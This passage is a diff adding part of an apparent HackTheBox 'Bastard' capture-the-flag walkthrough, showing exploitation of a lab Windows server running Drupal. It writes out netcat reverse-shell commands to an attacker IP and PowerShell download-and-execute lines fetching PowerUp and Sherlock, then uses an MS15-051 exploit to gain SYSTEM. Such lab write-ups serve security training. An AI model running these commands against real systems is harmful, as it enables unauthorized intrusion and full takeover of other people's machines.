@@ -299,3 +299,355 @@ Now, after saving and visiting `http://ip/node/3?fexec=whoami`, I get the follow
 ![bas-7](https://user-images.githubusercontent.com/87711310/215782562-a69d54d3-d8aa-41b3-98d2-6ad891468db9.png)
 
 Using `systeminfo` command, I figured out that it was a `64-bit operating system`. So, now I downloaded the 64-bit executable of netcat from [here](https://eternallybored.org/misc/netcat/).
+
+Started a python server to host the file
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
+└─$ python3 -m http.server 7777
+Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
+```
+
+Uploaded the `netcat` file using the `fupload` parameter
+```
+http://IP/node/3?fupload=nc64.exe
+```
+
+Then set up a listener on my attack machine.
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
+└─$ nc -nlvp 8888
+listening on [any] 8888 ...
+```
+
+Used the upload `netcat` executable to send a reverse shell to my attack machine
+```
+?fexec=nc64.exe -e cmd.exe 10.10.16.2 8888 
+```
+
+And I got a shell!!
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
+└─$ nc -nlvp 8888
+listening on [any] 8888 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.9] 49254
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\iusr
+
+C:\inetpub\drupal-7.54>
+```
+
+I grabbed the user flag
+```
+C:\inetpub\drupal-7.54>cd C:\Users
+cd C:\Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C4CD-C60B
+
+ Directory of C:\Users
+
+19/03/2017  07:35 ��    <DIR>          .
+19/03/2017  07:35 ��    <DIR>          ..
+19/03/2017  01:20 ��    <DIR>          Administrator
+19/03/2017  01:54 ��    <DIR>          Classic .NET AppPool
+19/03/2017  07:35 ��    <DIR>          dimitris
+14/07/2009  06:57 ��    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)   4.135.133.184 bytes free
+
+C:\Users>cd dimitris
+cd dimitris
+
+C:\Users\dimitris>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C4CD-C60B
+
+ Directory of C:\Users\dimitris
+
+19/03/2017  07:35 ��    <DIR>          .
+19/03/2017  07:35 ��    <DIR>          ..
+19/03/2017  07:35 ��    <DIR>          Contacts
+19/03/2017  08:04 ��    <DIR>          Desktop
+19/03/2017  07:35 ��    <DIR>          Documents
+19/03/2017  07:35 ��    <DIR>          Downloads
+19/03/2017  07:35 ��    <DIR>          Favorites
+19/03/2017  07:35 ��    <DIR>          Links
+19/03/2017  07:35 ��    <DIR>          Music
+19/03/2017  07:35 ��    <DIR>          Pictures
+19/03/2017  07:35 ��    <DIR>          Saved Games
+19/03/2017  07:35 ��    <DIR>          Searches
+19/03/2017  07:35 ��    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)   4.135.133.184 bytes free
+
+C:\Users\dimitris>cd Desktop
+cd Desktop
+
+C:\Users\dimitris\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C4CD-C60B
+
+ Directory of C:\Users\dimitris\Desktop
+
+19/03/2017  08:04 ��    <DIR>          .
+19/03/2017  08:04 ��    <DIR>          ..
+02/02/2023  07:47 ��                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4.135.133.184 bytes free
+
+C:\Users\dimitris\Desktop>type user.txt
+type user.txt
+[REDACTED]
+
+C:\Users\dimitris\Desktop>
+
+```
+
+## Privilege Escalation
+Using `systeminfo` command we know the OS name and the version.
+
+```
+OS Name:                Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:             6.1.7600 N/A Build 7600
+```
+
+So, next I decided to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1), which is a `PrivEsc` script from the `Empire` toolkit.
+
+The command I used to get the `PowerUp.ps1` is:
+```
+fexec=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:7777/PowerUp.ps1') | powershell -noprofile -
+```
+
+The result:
+```
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 1204
+ProcessId   : 964
+Name        : 964
+Check       : Process Token Privileges
+
+Get-WmiObject : Access denied 
+At line:2066 char:34
++     $VulnServices = Get-WmiObject <<<<  -Class win32_service | Where-Object {
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
+   tException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
+   ommands.GetWmiObjectCommand
+ 
+Get-WmiObject : Access denied 
+At line:2133 char:18
++     Get-WMIObject <<<<  -Class win32_service | Where-Object {$_ -and $_.pathn
+ame} | ForEach-Object {
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
+   tException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
+   ommands.GetWmiObjectCommand
+ 
+Get-Service : Cannot open Service Control Manager on computer '.'. This operati
+on might require other privileges.
+At line:2189 char:16
++     Get-Service <<<<  | Test-ServiceDaclPermission -PermissionSet 'ChangeConf
+ig' | ForEach-Object {
+    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperatio 
+   nException
+    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.Power 
+   Shell.Commands.GetServiceCommand
+ 
+ModifiablePath    : C:\oracle\ora90\bin
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+%PATH%            : C:\oracle\ora90\bin
+Name              : C:\oracle\ora90\bin
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'
+
+ModifiablePath    : C:\oracle\ora90\bin
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+%PATH%            : C:\oracle\ora90\bin
+Name              : C:\oracle\ora90\bin
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'
+
+ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
+Name              : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.005
+                    03\bin\mswin32-x86\wlbsctrl.dll'
+
+ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
+Name              : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.005
+                    03\bin\mswin32-x86\wlbsctrl.dll'
+
+Add-Type : Could not load file or assembly 'System.Core, Version=3.5.0.0, Cultu
+re=neutral, PublicKeyToken=b77a5c561934e089' or one of its dependencies. The sy
+stem cannot find the file specified.
+At line:4374 char:13
++     Add-Type <<<<  -Assembly System.Core
+    + CategoryInfo          : NotSpecified: (:) [Add-Type], FileNotFoundExcept 
+   ion
+    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerS 
+   hell.Commands.AddTypeCommand
+```
+
+Looking at the results, I did not find anything useful, but this script is very much useful if you want to find low hanging fruits to quickly escalate your privileges.
+
+Now, I decided to run [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1) in the similar way.
+
+NOTE: Sherlock is a depricated script so you might wanna use [Watson](https://github.com/rasta-mouse/Watson), which is an upgraded version of Sherlock
+
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:7777/Sherlock.ps1') | powershell -noprofile -
+```
+
+And it gave me the results
+
+```
+C:\inetpub\drupal-7.54>echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:7777/Sherlock.ps1') | powershell -noprofile -
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:7777/Sherlock.ps1') | powershell -noprofile -                                                                                                                                                                                                          
+
+                                                                                                                                                                                                                                                                                                                            
+Title      : User Mode to Ring (KiTrap0D)                                                                                                                                                           
+MSBulletin : MS10-015                                                                                                                                                          
+CVEID      : 2010-0232                                                                                                                                                            
+Link       : https://www.exploit-db.com/exploits/11199/                                                                                                                                                          
+VulnStatus : Not supported on 64-bit systems                                                                                                                                                         
+                                                                                                                                                                                                                                                                                                                            
+Title      : Task Scheduler .XML                                                                                                                                                        
+MSBulletin : MS10-092                                                                                                                                                          
+CVEID      : 2010-3338, 2010-3888                                                                                                                                                           
+Link       : https://www.exploit-db.com/exploits/19930/                                                                                                                                                         
+VulnStatus : Appears Vulnerable                                                                                                                                                        
+                                                                                                                                                                                                                                                                                                                            
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow                                                                                                                                                                                                                                                                  
+MSBulletin : MS13-053                                                                                                                                                                                                                                                                                                       
+CVEID      : 2013-1300                                                                                                                                                                                                                                                                                                      
+Link       : https://www.exploit-db.com/exploits/33213/                                                                                                                                                                                                                                                                     
+VulnStatus : Not supported on 64-bit systems                                                                                                                                                                                                                                                                                
+                                                                                                                                                                                                                                                                                                                            
+Title      : TrackPopupMenuEx Win32k NULL Page                                                                                                                                                                                                                                                                              
+MSBulletin : MS13-081                                                                                                                                                                                                                                                                                                       
+CVEID      : 2013-3881                                                                                                                                                                                                                                                                                                      
+Link       : https://www.exploit-db.com/exploits/31576/                                                                                                                                                                                                                                                                     
+VulnStatus : Not supported on 64-bit systems                                                                                                                                                                                                                                                                                
+                                                                                                                                                                                                                                                                                                                            
+Title      : TrackPopupMenu Win32k Null Pointer Dereference                                                                                                                                                                                                                                                                 
+MSBulletin : MS14-058                                                                                                                                                                                                                                                                                                       
+CVEID      : 2014-4113                                                                                                                                                                                                                                                                                                      
+Link       : https://www.exploit-db.com/exploits/35101/                                                                                                                                                                                                                                                                     
+VulnStatus : Not Vulnerable                                                                                                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                                                                                                            
+Title      : ClientCopyImage Win32k                                                                                                                                                                                                                                                                                         
+MSBulletin : MS15-051                                                                                                                                                                                                                                                                                                       
+CVEID      : 2015-1701, 2015-2433                                                                                                                                                                                                                                                                                           
+Link       : https://www.exploit-db.com/exploits/37367/                                                                                                                                                                                                                                                                     
+VulnStatus : Appears Vulnerable                                                                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                                                                                            
+Title      : Font Driver Buffer Overflow                                                                                                                                                                                                                                                                                    
+MSBulletin : MS15-078                                                                                                                                                                                                                                                                                                       
+CVEID      : 2015-2426, 2015-2433                                                                                                                                                                                                                                                                                           
+Link       : https://www.exploit-db.com/exploits/38222/                                                                                                                                                                                                                                                                     
+VulnStatus : Not Vulnerable                                                                                                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                                                                                                            
+Title      : 'mrxdav.sys' WebDAV                                                                                                                                                                                                                                                                                            
+MSBulletin : MS16-016                                                                                                                                                                                                                                                                                                       
+CVEID      : 2016-0051                                                                                                                                                                                                                                                                                                      
+Link       : https://www.exploit-db.com/exploits/40085/                                                                                                                                                                                                                                                                     
+VulnStatus : Not supported on 64-bit systems                                                                                                                                                                                                                                                                                
+                                                                                                                                                                                                                                                                                                                            
+Title      : Secondary Logon Handle                                                                                                                                                                                                                                                                                         
+MSBulletin : MS16-032                                                                                                                                                                                                                                                                                                       
+CVEID      : 2016-0099                                                                                                                                                                                                                                                                                                      
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+             6-034?
+VulnStatus : Not Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+             ample-Exploits/MS16-135
+VulnStatus : Not Vulnerable
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+             tml
+VulnStatus : Not Vulnerable
+
+```
+
+Out of all the results, `MS10-092`, `MS15-051`, & `MS16-032` appears to be vulnerable. So, now, I googled `MS15-051 exploit`, and found a [exploit](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip) that I could download and upload it on the machine to exploit it.
+
+So, I downloaded the `zip` file, extracted it, started my `python server`, transferred and ran the file.
+
+```
+fupload=ms15-051x64.exe&fexec=ms15-051x64.exe whoami
+```
+
+bas-9
+
+And guess what? I got a NT-authority\system from the machine, which means the exploit works and now all I gotta do is get back a reverse shell from the machine and I can be `root`
+
+```
+fupload=ms15-051x64.exe&fexec=ms15-051x64.exe ''nc -e cmd.exe 10.10.16.2 4444"'
+```
+
+And I started my netcat listener and after a few moments I was able to recive the `root` shell!!
+```
+┌──(darshan㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.9] 49333
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\system
+
+C:\inetpub\drupal-7.54>
+
+```
+
+Grabbing the `root` flag
+```
+C:\inetpub\drupal-7.54>cd C:\Users
+cd C:\Users
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+[REDACTED]
+
+```
